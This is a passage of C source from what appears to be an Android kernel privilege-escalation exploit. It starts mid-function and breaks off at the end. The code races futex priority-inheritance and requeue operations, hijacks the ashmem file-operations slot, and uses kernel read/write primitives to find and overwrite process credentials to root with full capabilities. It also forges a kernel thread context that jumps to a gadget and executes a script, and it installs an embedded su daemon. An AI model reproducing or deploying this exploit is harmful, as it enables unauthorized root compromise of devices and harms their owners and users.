            enforce_seen = slide_enforce_value();
          }
          if (slide_win_detected()) {
            slide_owner_state_print("win-check");
            slide_round_win = 1;
            atomic_store(&slide_consume_stop, 1);
            if (enforce_seen != 0) {
              enforce_seen = slide_enforce_value();
            }
            pr_success("slide one-walk WIN enforce=%d\n", enforce_seen);
            pr_success("[!] slide target WIN (one-walk)\n");
            won = 1;
            atomic_store(&slide_futex_gate, 0);
          }
          {
            int otid2 = atomic_load(&slide_owner_tid);
            for (int refire = 0; !won && refire < (int)refire_max() &&
                                 otid2 > 0 && atomic_load(&slide_heal_seq) < 1;
                 refire++) {
              slide_probe("refire");
              errno = 0;
              pr_info("slide refire n=%d att=%lu walk_done=%d entering=%d "
                      "heal_seq=%d\n",
                      refire, (unsigned long)slide_gsr_attempt, slide_walk_done,
                      atomic_load_explicit(&slide_owner_entering,
                                           memory_order_acquire),
                      atomic_load(&slide_heal_seq));
              if (!slide_kill_gate(otid2, "refire", kgate_ms)) {
                continue;
              }
              errno = 0;
              syscall(SYS_tgkill, getpid(), otid2, SIGUSR1);
              for (int k = 0; k < 30 && slide_walk_done < 1 && !slide_round_win;
                   k++) {
                usleep(10000);
              }
              if (slide_win_detected()) {
                slide_round_win = 1;
                atomic_store(&slide_consume_stop, 1);
                pr_success("[!] slide refire WIN\n");
                won = 1;
                atomic_store(&slide_futex_gate, 0);
              }
            }
          }
          {
            int rounds = env_int_range("SLIDE_FIRE_ROUNDS", 1, 1, 64);
            long inter_ms =
                env_int_range("SLIDE_FIRE_INTERVAL_MS", 300, 10, 60000);
            int otid3 = atomic_load(&slide_owner_tid);
            for (int rnd = 1; !won && rnd < rounds && otid3 > 0; rnd++) {
              usleep(inter_ms * 1000);
              slide_probe("round-fire");
              errno = 0;
              if (slide_kill_gate(otid3, "round-fire", kgate_ms)) {
                errno = 0;
                syscall(SYS_tgkill, getpid(), otid3, SIGUSR1);
              }
              pr_info("slide consumer round-fire %d/%d owner=%d\n", rnd + 1,
                      rounds, otid3);
              for (int k = 0; k < 30 && slide_walk_done < 1 && !slide_round_win;
                   k++) {
                usleep(10000);
              }
              if (slide_win_detected()) {
                slide_round_win = 1;
                atomic_store(&slide_consume_stop, 1);
                pr_success("[!] slide round-fire WIN (round %d)\n", rnd + 1);
                won = 1;
                atomic_store(&slide_futex_gate, 0);
              }
            }
          }
        }
        if (won) {
          {
            const char *lt = slide_active_target();
            if (lt && strcmp(lt, "fops") != 0) {
              slide_v143_gate_open_if_parked("consumer-win");
            }
          }
          if (fake_fops) {
            if (util_fops_armed() && !util_frame_guard(slide_dump_cached_fd)) {
              pr_warning("v113 stage2 consumer: frame-foreign -> park "
                         "(no openat)\n");
              slide_park_sleep();
            }
            int vfd = open_ashmem_device();
            if (vfd >= 0) {
              slide_v114_repair_llseek(vfd, "stage2");
              if (!slide_v114_chain_pending()) {
                slide_v114_early_slot_restore(vfd, "stage2");
              } else {
                pr_warning("v114 early restore skipped: child chain still "
                           "needs the hijacked open\n");
              }
              unsigned char vbuf[16];
              memset(vbuf, 0, sizeof(vbuf));
              ssize_t vrd = configfs_read_once(vfd, slide_lock_addr(), vbuf,
                                               sizeof(vbuf));
              pr_warning("slide stage2 fops verify rd=%zd\n", vrd);
              if (vrd == (ssize_t)sizeof(vbuf)) {
                if (env_flag("SLIDE_V143_HYGIENE", 1) &&
                    env_flag("SLIDE_V143_SLOT_SCRUB", 1)) {
                  slide_v143_hijack_fd = vfd;
                  pr_info("v143 step4 channel armed fd=%d\n", vfd);
                }
                int fr = slide_full_root(vfd);
                pr_success("slide stage2 fullroot ret=%d uid=%d\n", fr,
                           (int)getuid());
                if (fr == 0) {
                  pid_t su_pid = -1;
                  errno = 0;
                  int su_ret = install_embedded_su(&su_pid);
                  pr_success("slide stage2 su install ret=%d daemon=%d "
                             "errno=%d\n",
                             su_ret, (int)su_pid, errno);
                  if (env_flag("SLIDE_PHASE_CAL_ENABLE", 0)) {
                    slide_phase_cal_parent();
                  }
                }
                {
                  uint64_t orig_a = ASHMEM_FOPS_STRUCT;
                  ssize_t vwr_a = configfs_write_once(
                      vfd, ASHMEM_MISC_FOPS_SLOT, &orig_a, sizeof(orig_a));
                  pr_warning("slide stage2 hijack slot restore=%zd\n", vwr_a);
                }
              }
              if (slide_v143_hijack_fd != vfd) {
                close(vfd);
              }
            } else {
              pr_warning("slide stage2 fops open failed errno=%d\n", errno);
            }
          }
          slide_park_sleep();
        }
        reaper_note("main one-walk MISS enforce=%d -> park (reaper fork next)",
                    enforce_seen);
        slide_owner_state_print("miss-verdict");
        slide_dump_walk_state("one-walk-miss");
        pr_warning("slide one-walk MISS (enforce=%d) -> parking (R253: exit "
                   "teardown = R92 panic class, no return)\n",
                   enforce_seen);
        if (slide_active_target() && !strcmp(slide_active_target(), "leak")) {
          sleep(1);
          slide_leak_readback_report();
          sleep(1);
          slide_leak_readback_report();
        }
        atomic_store(&slide_consume_stop, 1);
        if (env_flag("SLIDE_V143_PARK_GATE", 1) && !slide_v143_gate_open) {
          slide_v143_gate_open = 1;
          pr_info("v143g gate open (a-round one-walk miss)\n");
        }
        slide_park_sleep();
        return NULL;
      }
    }

    if (env_flag("SLIDE_FULLWALK", 1) && !slide_round_win) {
      while ((long)slide_gsr_attempt < seq + 20) {
        __asm__ volatile("yield" ::: "memory");
      }
      pr_info("slide consumer fullwalk LOCK_PI entering tid=%d\n",
              (int)syscall(SYS_gettid));
      errno = 0;
      slide_futex_guard("fullwalk-lockpi", FUTEX_LOCK_PI);
      long fr2 = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
      pr_info("slide consumer fullwalk returned ret=%ld errno=%d\n", fr2,
              errno);
    }
    usleep(50000);
    atomic_store(&slide_consume_stop, 1);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_enter_sched, calls + 1);
    atomic_store(&slide_consume_calls, calls + 1);
    pr_info("slide consumer fire waiter_tid=%d -> %ld errno=%d\n", tid, ret,
            saved_errno);
    {
      char buf[80];
      int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
      ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : -1;
      if (n > 0) {
        buf[n] = 0;
        pr_warning("slide post-fire boot_id=%s", buf);
      }
      if (fd >= 0) {
        close(fd);
      }
    }
    atomic_store(&slide_consume_go, 0);
    return NULL;
  }
}

void *slide_arm_host_thread(void *arg __attribute__((unused))) {
  atomic_store(&slide_arm_host_tid, (int)syscall(SYS_gettid));
  pr_info("slide arm host thread enter tid=%d cpu=%d\n",
          (int)syscall(SYS_gettid), sched_getcpu());
  while (!atomic_load(&slide_arm_host_go)) {
    usleep(1000);
  }
  pr_info("v121c arm host go host=%d chain2=%016llx\n",
          (int)syscall(SYS_gettid), (unsigned long long)slide_f_pi_chain2);
  errno = 0;
  long hr = futex_op(&slide_f_pi_chain2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int he = errno;
  pr_info("v121c arm host returned host=%d ret=%ld errno=%d (walk lands at "
          "enqueue, before this line)\n",
          (int)syscall(SYS_gettid), hr, he);
  slide_park_sleep();
}

static void slide_v143_tree_hygiene(void) {
  if (!env_flag("SLIDE_V143_HYGIENE", 1)) {
    return;
  }
  int won_at_enter = slide_round_win;
  int stop_at_enter = (int)atomic_load(&slide_consume_stop);
  unsigned long gate_wait_ms = 0;
  if (env_flag("SLIDE_V143_PARK_GATE", 1)) {
    size_t g0 = gettime_ns();
    long gcap = env_int_range("SLIDE_V143_PARK_GATE_MS", 30000, 1000, 600000);
    while (!slide_v143_gate_open) {
      unsigned long el = (unsigned long)((gettime_ns() - g0) / 1000000UL);
      if ((long)el > gcap) {
        pr_warning("v143c park-gate TIMEOUT %lums gate=%d -> skip deep "
                   "hygiene (v142 flow)\n",
                   el, slide_v143_gate_open);
        return;
      }
      __asm__ volatile("yield" ::: "memory");
    }
    gate_wait_ms = (unsigned long)((gettime_ns() - g0) / 1000000UL);
  }
  atomic_store(&slide_futex_gate, 0);
  struct timespec ts;
  if (clock_gettime(CLOCK_REALTIME, &ts) == 0) {
    ts.tv_nsec += 100000000L;
    if (ts.tv_nsec >= 1000000000L) {
      ts.tv_sec += 1;
      ts.tv_nsec -= 1000000000L;
    }
  } else {
    int ce = errno;
    pr_warning("v143 step1 clock_gettime errno=%d -> expired-abs fallback\n",
               ce);
    ts.tv_sec = 0;
    ts.tv_nsec = 0;
  }
  errno = 0;
  slide_futex_guard("v143-step1-decoy", FUTEX_LOCK_PI);
  long r1 = futex_op(&slide_f_pi_decoy, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
  int e1 = errno;
  pr_info("v143 hygiene enter won=%d stop=%d gate_wait_ms=%lu\n", won_at_enter,
          stop_at_enter, gate_wait_ms);
  if (r1 == -1 && e1 == ETIMEDOUT) {
    pr_success("v143 step1 fuse pulled: LOCK_PI -ETIMEDOUT (V2: "
               ":1172 overwrite + :1477 clear both executed)\n");
  } else if (r1 == 0) {
    pr_warning("v143 step1 unexpected LOCK_PI ret=0 (decoy released "
               "early = integration error) -> log+continue\n");
  } else {
    pr_warning("v143 step1 LOCK_PI ret=%ld errno=%d (non-ETIMEDOUT) -> "
               "log+continue\n",
               r1, e1);
  }
  int tmo_ms = env_int_range("SLIDE_V143_HYGIENE_TIMEOUT_MS", 10000, 0, 120000);
  if (slide_v143_cmd_fd[0] >= 0) {
    struct pollfd pf;
    pf.fd = slide_v143_cmd_fd[0];
    pf.events = POLLIN;
    pf.revents = 0;
    size_t t0 = gettime_ns();
    errno = 0;
    int pr = poll(&pf, 1, tmo_ms);
    int pe = errno;
    pr_info("v143 hygiene marker poll=%d errno=%d waited_ms=%lu revents=0x%x\n",
            pr, pe, (unsigned long)((gettime_ns() - t0) / 1000000UL),
            (unsigned)pf.revents);
  } else {
    pr_warning("v143 hygiene no cmd channel (H-B not created) -> proceed\n");
  }
  errno = 0;
  slide_futex_guard("v143-step2-chain-unlock", FUTEX_UNLOCK_PI);
  long r2 = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("v143 step2 chain UNLOCK_PI ret=%ld errno=%d\n", r2, errno);
  errno = 0;
  slide_futex_guard("v143-step3-chain2-unlock", FUTEX_UNLOCK_PI);
  long r3 = futex_op(&slide_f_pi_chain2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("v143 step3 chain2 UNLOCK_PI ret=%ld errno=%d\n", r3, errno);
  if (env_flag("SLIDE_V143_SLOT_SCRUB", 1)) {
    int vfd = slide_v143_hijack_fd;
    uint64_t glk = slide_lock_addr();
    unsigned char lb[32];
    ssize_t lrd = -1;
    if (vfd >= 0) {
      memset(lb, 0x5A, sizeof(lb));
      lrd = configfs_read_once(vfd, glk, lb, sizeof(lb));
    }
    if (vfd < 0 || lrd != (ssize_t)sizeof(lb)) {
      pr_warning("v143 step4 slot-scrub skipped (no channel) vfd=%d "
                 "rd=%zd slot=%llx\n",
                 vfd, lrd, (unsigned long long)glk);
    } else {
      static const unsigned char z24[24] = {0};
      static const unsigned char z4[4] = {0};
      errno = 0;
      ssize_t w1 = configfs_write_once(vfd, glk + 8, z24, sizeof(z24));
      ssize_t w2 = configfs_write_once(vfd, glk, z4, sizeof(z4));
      memset(lb, 0x5A, sizeof(lb));
      ssize_t vrd = configfs_read_once(vfd, glk, lb, sizeof(lb));
      uint64_t q0 = 0, q1 = 0, q2 = 0, q3 = 0;
      if (vrd == (ssize_t)sizeof(lb)) {
        memcpy(&q0, lb + 0, 8);
        memcpy(&q1, lb + 8, 8);
        memcpy(&q2, lb + 16, 8);
        memcpy(&q3, lb + 24, 8);
      }
      int v1 = vrd == (ssize_t)sizeof(lb) && q0 == 0 && q1 == 0 && q2 == 0 &&
               q3 == 0;
      pr_info("v143 step4 slot=%llx pre_rd=%zd tree_wr=%zd lock_wr=%zd "
              "vrd=%zd q0=%016llx q1=%016llx q2=%016llx q3=%016llx V1=%d\n",
              (unsigned long long)glk, lrd, w1, w2, vrd, (unsigned long long)q0,
              (unsigned long long)q1, (unsigned long long)q2,
              (unsigned long long)q3, v1);
    }
  } else {
    pr_warning("v143 step4 slot-scrub disabled (SLIDE_V143_SLOT_SCRUB=0)\n");
  }
  if (slide_v143_ack_fd[1] >= 0) {
    errno = 0;
    ssize_t aw = write(slide_v143_ack_fd[1], "A", 1);
    pr_info("v143 step5 ack write=%zd errno=%d\n", aw, errno);
  } else {
    pr_warning("v143 step5 no ack channel (fd=%d)\n", slide_v143_ack_fd[1]);
  }
  slide_park_sleep();
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  atomic_store(&slide_waiter_tid, (int)syscall(SYS_gettid));
  pr_info("slide waiter thread enter tid=%d\n", (int)syscall(SYS_gettid));
  slide_futex_guard("waiter-lock-chain", FUTEX_LOCK_PI);
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }
  if (slide_v114_twostage()) {
    slide_futex_guard("waiter-chain2-lock", FUTEX_LOCK_PI);
    errno = 0;
    if (futex_op(&slide_f_pi_chain2, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
      pr_warning("v121c waiter chain2 lock failed errno=%d (the arm host "
                 "will acquire instantly and the arm walk will not land)\n",
                 errno);
    } else {
      pr_info("v121c waiter owns chain2=%016llx (arm host target)\n",
              (unsigned long long)slide_f_pi_chain2);
    }
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec +=
      (long)env_int_range("SLIDE_WAIT_SECONDS", SLIDE_WAIT_SECONDS, 1, 120);

  int fpad_bytes = env_int_range("SLIDE_FPAD", 0, 0, 256);
  if (fpad_bytes > 0) {
    volatile char *fpad = (volatile char *)alloca((size_t)fpad_bytes);
    (void)fpad;
    pr_info("slide futex pad=%d bytes\n", fpad_bytes);
  }
  atomic_store(&slide_waiter_waiting, 1);
  slide_requeue_exit_ns = 0;
  atomic_store_explicit(&slide_waiter_in_requeue, 1, memory_order_release);
  slide_futex_guard("waiter-wait-requeue", FUTEX_WAIT_REQUEUE_PI);
  long wr_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                         &slide_f_pi_target, 0);
  int wr_errno = errno;
  slide_requeue_exit_ns = gettime_ns();
  atomic_store_explicit(&slide_waiter_in_requeue, 0, memory_order_release);
  pr_info("slide waiter REQUEUE_PI returned ret=%ld errno=%d tid=%d\n", wr_ret,
          wr_errno, (int)syscall(SYS_gettid));
  {
    char pb[48];
    snprintf(pb, sizeof(pb), "wr-ret=%ld e=%d", wr_ret, wr_errno);
    slide_probe(pb);
  }
  slide_waiter_nosys = env_flag("SLIDE_WAITER_NOSYS", 1);
  if (slide_waiter_nosys) {
    pr_info("waiter nosys freeze armed until=%d\n", (int)timeout.tv_sec);
  }
  if (env_flag("SLIDE_KEEP_CHAIN", 1)) {
    if (env_flag("SLIDE_PAINT_MAIN", 0)) {
      for (;;) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (env_flag("SLIDE_DEEP_ENABLE", 0)) {
      slide_deep_stack_copy();
    }
    {
      int rt = slide_paint_route();
      if (rt == 2) {
        slide_adjtimex_stack_copy();
      } else if (rt == 1) {
        slide_tcp_stack_copy();
      } else {
        slide_pselect_stack_copy();
      }
    }
    slide_v143_tree_hygiene();
    while (!atomic_load(&slide_fire_done) &&
           !atomic_load(&slide_consume_stop)) {
      __asm__ volatile("yield" ::: "memory");
    }
    if ((atomic_load(&slide_v114_stage) != SLIDE_V114_STAGE_PROBE ||
         !env_flag("SLIDE_PROBE_DEFER_UNLOCK", 0)) &&
        !atomic_load(&slide_probe_unlocked)) {
      if (!env_flag("SLIDE_NO_POST_UNLOCK", 0)) {
        atomic_store(&slide_futex_gate, 0);
        slide_v121e_stamp(&slide_v121e_e1b_ns);
        slide_futex_guard("waiter-post-unlock", FUTEX_UNLOCK_PI);
        futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        slide_probe("post-unlock");
      }
    }
    for (;;) {
      __asm__ volatile("yield" ::: "memory");
    }
  }
  atomic_store(&slide_futex_gate, 0);
  slide_futex_guard("waiter-unlock", FUTEX_UNLOCK_PI);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  {
    int rt = slide_paint_route();
    if (rt == 2) {
      slide_adjtimex_stack_copy();
    } else if (rt == 1) {
      slide_tcp_stack_copy();
    } else {
      slide_pselect_stack_copy();
    }
  }
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

#ifndef ASHMEM_SET_SIZE
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 2, size_t)
#endif
#define Z2_ASHMEM_AREA_CACHEP_OFF 0x021005a8ULL
#define Z2_ASHMEM_AREA_CACHEP \
  P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + Z2_ASHMEM_AREA_CACHEP_OFF)
#define Z2_VMEMMAP_START 0xfffffffe00000000ULL
#define Z2_PAGE_OFFSET 0xffffff8000000000ULL
#define Z2_PHYS_OFFSET 0x40000000ULL
#define Z2_KMC_NODE_OFF 0x108
#define Z2_KMC_SIZE_OFF 0x18
#define Z2_KMC_OO_OFF 0x34
#define Z2_KMCN_PARTIAL_OFF 0x10
#define Z2_KMCN_FULL_OFF 0x30
#define Z2_SLAB_LIST_OFF 0x8
#define Z2_SLAB_CACHE_OFF 0x18
#define Z2_AREA_FILE_OFF 0x120
#define Z2_FILE_FCRED_OFF 0xa0
#define Z2_CRED_UID_OFF 4
#define Z2_CRED_SUID_OFF 0xc
#define Z2_CRED_EUID_OFF 0x14
#define Z2_CRED_FSUID_OFF 0x1c
#define Z2_CRED_CAP0_OFF 0x30
#define Z2_CRED_CAP1_OFF 0x38
#define Z2_CRED_CAP2_OFF 0x40
#define Z2_CRED_CAPS 0x000001ffffffffffULL

static uint64_t z2_le64(const void *p) {
  uint64_t v;
  memcpy(&v, p, sizeof(v));
  return v;
}

static char z2_vfd_tag[16];

static int slide_prep_ashmem_anchor(int vfd) {
  size_t sz = 4096;
  if (ioctl(vfd, ASHMEM_SET_SIZE, sz) != 0) {
    pr_warning("ashmem anchor set_size failed errno=%d\n", errno);
    return 0;
  }
  snprintf(z2_vfd_tag, sizeof(z2_vfd_tag), "GLVFD%05d", (int)getpid());
  if (ioctl(vfd, ASHMEM_SET_NAME, z2_vfd_tag) != 0) {
    pr_warning("ashmem anchor set_name failed errno=%d\n", errno);
    z2_vfd_tag[0] = 0;
  }
  void *map = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, vfd, 0);
  if (map == MAP_FAILED) {
    pr_warning("ashmem anchor mmap failed errno=%d\n", errno);
    return 0;
  }
  int extra = 0;
  for (int i = 0; i < 7; i++) {
    int t = open_ashmem_device();
    if (t < 0) {
      break;
    }
    char tag[64];
    snprintf(tag, sizeof(tag), "GLTAG%05d-%d", (int)getpid(), i);
    (void)ioctl(t, ASHMEM_SET_NAME, tag);
    close(t);
    extra++;
  }
  pr_success("ashmem anchor ready fd=%d map=%p tag=%s extra=%d\n", vfd, map,
             z2_vfd_tag, extra);
  return 1;
}

static uintptr_t slide_find_our_area(int vfd, uintptr_t cachep) {
  uintptr_t node0 = kernel_read64(vfd, cachep + Z2_KMC_NODE_OFF);
  if (!node0) {
    return 0;
  }
  uint32_t size = (uint32_t)kernel_read64(vfd, cachep + Z2_KMC_SIZE_OFF);
  uint32_t oo = (uint32_t)kernel_read64(vfd, cachep + Z2_KMC_OO_OFF);
  uint32_t objects = oo & 0xffffu;
  if (size < 256 || objects == 0 || objects > 64) {
    pr_warning("ashmem cache bad size=%u objects=%u\n", size, objects);
    return 0;
  }
  {
    uintptr_t head = node0 + Z2_KMCN_PARTIAL_OFF;
    uintptr_t cur = kernel_read64(vfd, head);
    uintptr_t guard = 0;
    while (cur >= 0xffffff8000000000ULL && cur < 0xffffffff00000000ULL &&
           guard++ < 512) {
      uintptr_t slab = cur - Z2_SLAB_LIST_OFF;
      if (kernel_read64(vfd, slab + Z2_SLAB_CACHE_OFF) == cachep) {
        uintptr_t pfn = (slab - Z2_VMEMMAP_START) >> 6;
        uintptr_t base = (pfn << 12) - Z2_PHYS_OFFSET + Z2_PAGE_OFFSET;
        for (uint32_t i = 0; i < objects; i++) {
          uintptr_t obj = base + (uintptr_t)i * size;
          unsigned char hdr[272];
          if (kernel_read_data(vfd, obj, hdr, sizeof(hdr)) !=
              (ssize_t)sizeof(hdr)) {
            continue;
          }
          if (z2_le64(hdr) != CFG_PREFIX_COUNT) {
            continue;
          }
          if (z2_vfd_tag[0] &&
              memcmp(hdr + 11, z2_vfd_tag, strlen(z2_vfd_tag)) != 0) {
            continue;
          }
          uintptr_t file = kernel_read64(vfd, obj + Z2_AREA_FILE_OFF);
          if (!file) {
            continue;
          }
          uintptr_t cred = kernel_read64(vfd, file + Z2_FILE_FCRED_OFF);
          if (!cred) {
            continue;
          }
          uint32_t uid = (uint32_t)kernel_read64(vfd, cred + Z2_CRED_UID_OFF);
          if (uid != 2000) {
            continue;
          }
          pr_success("ashmem area found obj=%016zx file=%016zx cred=%016zx\n",
                     (uintptr_t)obj, (uintptr_t)file, (uintptr_t)cred);
          return obj;
        }
      }
      if (cur == head) {
        break;
      }
      cur = kernel_read64(vfd, cur);
    }
  }
  return 0;
}

static int slide_patch_cred_fields(int vfd, uintptr_t cred) {
  uint32_t zero = 0;
  uint64_t caps = Z2_CRED_CAPS;
  ssize_t n;
  n = configfs_write_once(vfd, cred + Z2_CRED_UID_OFF, &zero, 4);
  if (n != 4)
    return -1;
  n = configfs_write_once(vfd, cred + Z2_CRED_SUID_OFF, &zero, 4);
  if (n != 4)
    return -2;
  n = configfs_write_once(vfd, cred + Z2_CRED_EUID_OFF, &zero, 4);
  if (n != 4)
    return -3;
  n = configfs_write_once(vfd, cred + Z2_CRED_FSUID_OFF, &zero, 4);
  if (n != 4)
    return -4;
  n = configfs_write_once(vfd, cred + Z2_CRED_CAP0_OFF, &caps, 8);
  if (n != 8)
    return -5;
  n = configfs_write_once(vfd, cred + Z2_CRED_CAP1_OFF, &caps, 8);
  if (n != 8)
    return -6;
  n = configfs_write_once(vfd, cred + Z2_CRED_CAP2_OFF, &caps, 8);
  if (n != 8)
    return -7;
  return 0;
}

static int slide_cred_via_ashmem(int vfd) {
  (void)slide_prep_ashmem_anchor(vfd);
  uintptr_t cachep = kernel_read64(vfd, Z2_ASHMEM_AREA_CACHEP);
  if (!cachep) {
    pr_warning("ashmem cachep read failed\n");
    return -8;
  }
  uintptr_t area = slide_find_our_area(vfd, cachep);
  if (!area) {
    pr_warning("ashmem area scan miss (retry next WIN)\n");
    return -9;
  }
  uintptr_t file = kernel_read64(vfd, area + Z2_AREA_FILE_OFF);
  uintptr_t cred = kernel_read64(vfd, file + Z2_FILE_FCRED_OFF);
  int pc = slide_patch_cred_fields(vfd, cred);
  pr_success("slide cred patch ret=%d uid_now=%d\n", pc, (int)getuid());
  return pc;
}

#define ZT_RUNQUEUES 0xffffffc00a0d1e40ULL
#define ZT_PER_CPU_OFFSET 0xffffffc00a0fb848ULL
#define ZT_RQ_CURR_OFF 0xaa0ULL
#define ZT_TASK_THREAD_OFF 0x10a0ULL
#define ZT_CTX_X19_OFF 0
#define ZT_CTX_X20_OFF 8
#define ZT_CTX_X21_OFF 16
#define ZT_CTX_SP_OFF 88
#define ZT_CTX_PC_OFF 96
#define ZT_INIT_CRED 0xffffffc00a122430ULL
#define ZT_GADGET_PC 0xffffffc0080d8474ULL
#define ZT_FORGE_BASE 0xffffffc00a122d88ULL
#define ZT_FORGE_PATH (ZT_FORGE_BASE + 0x80ULL)
#define ZT_FORGE_ARGV (ZT_FORGE_BASE + 0x90ULL)
#define ZT_FORGE_ENVP (ZT_FORGE_BASE + 0xa0ULL)
#define ZT_FORGE_STACK (ZT_FORGE_BASE + 0xc0ULL)
#define ZT_SCRIPT "/data/local/tmp/glm"

static volatile int zt_go;
static volatile uintptr_t zt_victim;

static void *slide_hijack_helper(void *arg) {
  int vfd = (int)(intptr_t)arg;
  cpu_set_t set;
  CPU_ZERO(&set);
  int cpu = sched_getcpu();
  if (cpu >= 0 && cpu < 64) {
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
  }
  uintptr_t task = 0;
  struct timespec ts = {.tv_sec = 0, .tv_nsec = 500000};
  for (int i = 0; i < 60 && !task; i++) {
    int c = sched_getcpu();
    if (c < 0)
      c = cpu;
    uintptr_t off = kernel_read64(vfd, ZT_PER_CPU_OFFSET + (uint64_t)c * 8);
    uintptr_t rq = ZT_RUNQUEUES + off;
    uintptr_t a = kernel_read64(vfd, rq + ZT_RQ_CURR_OFF);
    nanosleep(&ts, NULL);
    uintptr_t b = kernel_read64(vfd, rq + ZT_RQ_CURR_OFF);
    if (a == b && a >= 0xffffff8000000000ULL && a < 0xffffffc000000000ULL)
      task = a;
  }
  zt_victim = task;
  zt_go = 1;
  for (;;)
    nanosleep(&ts, NULL);
  return NULL;
}

static int slide_cred_via_thread(int vfd) {
  uint64_t zero64 = 0;
  uint64_t pathp = ZT_FORGE_PATH;
  uint32_t wait2 = 2;
  ssize_t n;
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x38, &zero64, 8);
  if (n != 8) {
    pr_warning("forge complete failed %zd\n", n);
    return -12;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x40, &pathp, 8);
  if (n != 8) {
    pr_warning("forge path failed %zd\n", n);
    return -13;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x48, &pathp, 8);
  if (n != 8) {
    pr_warning("forge argv failed %zd\n", n);
    return -14;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x50, &zero64, 8);
  if (n != 8) {
    pr_warning("forge envp failed %zd\n", n);
    return -15;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x58, &wait2, 4);
  if (n != 4) {
    pr_warning("forge wait failed %zd\n", n);
    return -16;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x5c, &zero64, 8);
  if (n != 8) {
    pr_warning("forge retval/init failed %zd\n", n);
    return -17;
  }
  n = configfs_write_once(vfd, ZT_FORGE_BASE + 0x68, &zero64, 8);
  if (n != 8) {
    pr_warning("forge cleanup failed %zd\n", n);
    return -18;
  }
  n = configfs_write_once(vfd, ZT_FORGE_PATH, ZT_SCRIPT, sizeof(ZT_SCRIPT));
  if (n != (ssize_t)sizeof(ZT_SCRIPT)) {
    pr_warning("forge path string failed %zd\n", n);
    return -19;
  }
  n = configfs_write_once(vfd, ZT_FORGE_ARGV, &pathp, 8);
  if (n != 8) {
    pr_warning("forge argv[0] failed %zd\n", n);
    return -20;
  }
  n = configfs_write_once(vfd, ZT_FORGE_ARGV + 8, &zero64, 8);
  if (n != 8) {
    pr_warning("forge argv[1] failed %zd\n", n);
    return -21;
  }
  n = configfs_write_once(vfd, ZT_FORGE_ENVP, &zero64, 8);
  if (n != 8) {
    pr_warning("forge envp[0] failed %zd\n", n);
    return -22;
  }
  zt_go = 0;
  zt_victim = 0;
  pthread_t th;
  if (pthread_create(&th, NULL, slide_hijack_helper, (void *)(intptr_t)vfd) !=
      0) {
    pr_warning("hijack thread create failed\n");
    return -23;
  }
  struct timespec p10 = {.tv_sec = 0, .tv_nsec = 10000000};
  int spins = 0;
  while (!zt_go && spins++ < 200)
    nanosleep(&p10, NULL);
  if (!zt_victim) {
    pr_warning("hijack: victim task address never resolved\n");
    return -24;
  }
  nanosleep(&p10, NULL);
  nanosleep(&p10, NULL);
  uintptr_t ctx = zt_victim + ZT_TASK_THREAD_OFF;
  uint64_t w;
  w = ZT_FORGE_BASE;
  if (configfs_write_once(vfd, ctx + ZT_CTX_X19_OFF, &w, 8) != 8)
    return -25;
  w = 0;
  if (configfs_write_once(vfd, ctx + ZT_CTX_X20_OFF, &w, 8) != 8)
    return -26;
  w = ZT_INIT_CRED;
  if (configfs_write_once(vfd, ctx + ZT_CTX_X21_OFF, &w, 8) != 8)
    return -27;
  w = 0;
  if (configfs_write_once(vfd, ctx + 24, &w, 8) != 8)
    return -28;
  if (configfs_write_once(vfd, ctx + 32, &w, 8) != 8)
    return -29;
  if (configfs_write_once(vfd, ctx + 40, &w, 8) != 8)
    return -30;
  if (configfs_write_once(vfd, ctx + 48, &w, 8) != 8)
    return -31;
  if (configfs_write_once(vfd, ctx + 56, &w, 8) != 8)
    return -32;
  if (configfs_write_once(vfd, ctx + 64, &w, 8) != 8)
    return -33;
  if (configfs_write_once(vfd, ctx + 72, &w, 8) != 8)
    return -34;
  if (configfs_write_once(vfd, ctx + 80, &w, 8) != 8)
    return -35;
  w = ZT_FORGE_STACK;
  if (configfs_write_once(vfd, ctx + ZT_CTX_SP_OFF, &w, 8) != 8)
    return -36;
  w = ZT_GADGET_PC;
  if (configfs_write_once(vfd, ctx + ZT_CTX_PC_OFF, &w, 8) != 8)
    return -37;
  pr_success("hijack: cpu_context rewritten, helper restores into gadget\n");
  return 0;
}

static int slide_full_root(int vfd) {
  uint32_t zero32 = 0;
